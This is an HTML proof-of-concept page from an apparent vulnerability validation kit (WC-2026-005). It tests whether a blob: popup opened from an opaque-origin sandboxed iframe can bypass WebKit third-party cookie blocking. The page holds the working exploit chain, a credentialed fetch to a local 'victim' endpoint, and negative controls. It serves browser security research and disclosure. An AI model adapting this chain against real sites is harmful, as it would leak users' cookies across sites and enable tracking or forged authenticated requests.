<!DOCTYPE html>
<!--
  WC-2026-005 validation kit — attacker page (LOCAL-ONLY test fixture)

  Purpose: demonstrate the candidate chain in an authorized local WebKit/Safari
  test environment. This page embeds an OPAQUE-ORIGIN sandboxed iframe
  (sandbox="allow-scripts allow-popups" WITHOUT allow-same-origin). The iframe
  creates a blob:null/<uuid> payload and opens it as a popup ONLY after a
  visible user click (popup blockers require a user gesture).

  The popup's blob document then issues a credentialed fetch to the local
  victim-origin endpoint served by server.py. The server logs whether the
  request carried the test cookie.

  This is a LOCAL-ONLY fixture: no real domains, no real accounts, no real
  cookies, no third-party services. All endpoints are 127.0.0.1.
-->
<html>
<head>
<meta charset="utf-8">
<title>WC-2026-005 local validation fixture</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 2em; }
  #status { margin: 1em 0; padding: 0.5em; border: 1px solid #ccc; min-height: 1.5em; }
  button { font-size: 1.2em; padding: 0.5em 1em; }
</style>
</head>
<body>
<h1>WC-2026-005 — opaque-origin blob: popup cookie-blocking check</h1>
<p>This page embeds a sandboxed iframe (opaque origin). The iframe creates a
<code>blob:null/&lt;uuid&gt;</code> payload and opens it as a popup when you
click the button below. The popup then fetches the local victim endpoint.</p>

<div id="status">Ready. Click the button to run the candidate case.</div>
<button id="run">Open opaque blob: popup (candidate case)</button>

<script>
const VICTIM = 'http://127.0.0.1:8765/victim';   // local victim-origin endpoint (server.py)
const LOG = 'http://127.0.0.1:8765/log';          // local log endpoint (server.py)

// The opaque-origin iframe. sandbox WITHOUT allow-same-origin => opaque origin.
// allow-scripts + allow-popups are required so the iframe can run JS and open
// the popup. The popup is opened from a user click INSIDE the iframe.
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts allow-popups';
iframe.srcdoc = `
  <!DOCTYPE html>
  <html><body>
    <button id="go" style="font-size:1.5em;padding:0.5em 1em;">Click to open blob: popup</button>
    <script>
      document.getElementById('go').addEventListener('click', function () {
        // Create a blob:null/<uuid> payload (opaque origin because this
        // document's origin is opaque).
        var payload = '<!DOCTYPE html><html><body>' +
          '<script>' +
          'fetch("${VICTIM}", {credentials: "include"})' +
          '.then(function(r){ return r.text(); })' +
          '.then(function(t){ window.opener.postMessage("POPUP_FETCH_DONE " + t, "*"); })' +
          '.catch(function(e){ window.opener.postMessage("POPUP_FETCH_ERR " + e, "*"); });' +
          '<\\/script>' +
          '</body></html>';
        var blob = new Blob([payload], {type: 'text/html'});
        var url = URL.createObjectURL(blob);
        // Report the blob URL scheme+origin shape to the parent for logging.
        window.parent.postMessage('BLOB_URL ' + url, '*');
        // Open the popup. User gesture present (click handler).
        var w = window.open(url, '_blank');
        if (!w) { window.parent.postMessage('POPUP_BLOCKED', '*'); }
      });
    <\\/script>
  </body></html>
`;
document.body.appendChild(iframe);

// Listen for messages from the iframe and the popup.
window.addEventListener('message', function (e) {
  var status = document.getElementById('status');
  status.textContent = '[' + new Date().toISOString() + '] ' + e.data;
  // Forward to the local log endpoint (no sensitive data; local only).
  fetch(LOG + '?msg=' + encodeURIComponent(e.data), {mode: 'no-cors'}).catch(function(){});
});
</script>

<hr>
<h2>Negative controls (run manually, one at a time)</h2>
<p><strong>Control 1 — non-opaque blob:</strong> replace the iframe above with
one that has <code>sandbox="allow-same-origin allow-scripts allow-popups"</code>
(keeps the parent origin, so the blob URL is <code>blob:http://127.0.0.1:8765/&lt;uuid&gt;</code>).
Expected: the popup's cross-site fetch to the victim endpoint is BLOCKED from
carrying cookies (decision All).</p>
<p><strong>Control 2 — ordinary third-party:</strong> from the top page, fetch
<code>${VICTIM}</code> with <code>credentials:'include'</code> directly.
Expected: BLOCKED from carrying cookies (cross-site, non-empty domains).</p>
<p><strong>Control 3 — first-party:</strong> from the top page, fetch
<code>http://127.0.0.1:8765/</code> (same origin). Expected: cookie IS sent
(first-party).</p>
</body>
</html>
